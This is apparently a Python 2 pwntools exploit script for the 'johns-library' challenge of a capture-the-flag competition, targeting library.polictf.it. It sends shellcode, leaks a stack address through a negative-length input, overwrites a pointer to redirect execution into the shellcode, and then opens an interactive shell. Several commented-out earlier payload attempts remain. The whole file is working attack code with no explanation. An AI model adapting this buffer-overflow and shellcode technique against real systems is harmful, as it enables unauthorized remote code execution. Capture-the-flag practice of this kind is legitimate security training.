#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

#context.log_level = 'debug'
context.terminal = ['terminator', '-e']

r = remote('library.polictf.it', 80)
#r = gdb.debug('./johns-library')

elf = ELF('./johns-library')
rop = ROP([elf])

sh = asm(shellcraft.sh())

ebp = 0xffffca88
esp = 0xffffc660
buf = esp + 0x1b

bufsize = ebp-buf

r.sendlinethen(': \n', 'a')
r.sendline('-{}'.format(0x24))
r.sendline(sh)
r.sendlineafter('exit\n', 'r')
r.sendlineafter(': ', '1')
ebp = u32(r.recvline()[:4])
log.info('EBP=%x', ebp)
r.sendline('a')
r.sendline('{}'.format(0x24))
#r.sendline('B'*4 + "CCCC")
buf=ebp + 4 * 2 - 0x415 #+ 0x41b
log.info('Buffer = %x', buf)
r.sendline('AAAA' + p32(buf))
#r.sendline('a')
#r.sendline('1')
#r.sendline(p32(ebp + 4 * 2 + 0x41b) + 'A' * 4 * 10 + sh)
#r.sendline(sh + ('A' * (bufsize + 6 - len(sh))) + p32(ebp + 0x41b))
#r.sendline('a')
r.sendline('u')
r.interactive()
